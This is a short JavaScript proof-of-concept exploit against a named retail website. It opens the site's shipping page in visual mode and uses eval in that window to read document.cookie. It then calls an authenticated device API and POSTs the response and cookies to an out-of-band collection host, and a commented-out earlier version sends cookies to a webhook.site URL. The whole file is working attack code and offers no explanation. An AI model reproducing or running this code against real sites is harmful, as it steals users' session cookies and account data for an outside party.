// // This runs in the iframe context
// var victimWindow = open('https://eur.halara.com/pages/shipping-customs?sa-visual-mode=true', 'victim-tab');

// // Wait for navigation to complete
// setTimeout(() => {
//     // Now we have cross-window access on same origin
//     victimWindow.eval(`
//         fetch('https://webhook.site/8586d1a4-d038-4478-bc85-21f5c63d3740/exfil?cookies=' + encodeURIComponent(document.cookie));
//     `);
// }, 2000);

var victimWindow = open('https://eur.halara.com/pages/shipping-customs?sa-visual-mode=true', 'victim-tab');

setTimeout(() => {
    victimWindow.eval(`
        fetch('https://api-proxy.eur.halara.com/mall-rest/api/v1/device/startup', {
            method: 'GET',
            credentials: 'include',
            headers: {
                'app-id': '29'
            }
        })
        .then(r => r.text())
        .then(data => {
            fetch('https://l8pjj46vil2a13abk2x66ed4x5fwywyy6.oast.site/exfil', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    api_response: data,
                    cookies: document.cookie
                })
            });
        })
        .catch(e => {
            fetch('https://l8pjj46vil2a13abk2x66ed4x5fwywyy6.oast.site/error?msg=' + encodeURIComponent(e.toString()));
        });
    `);
}, 2000);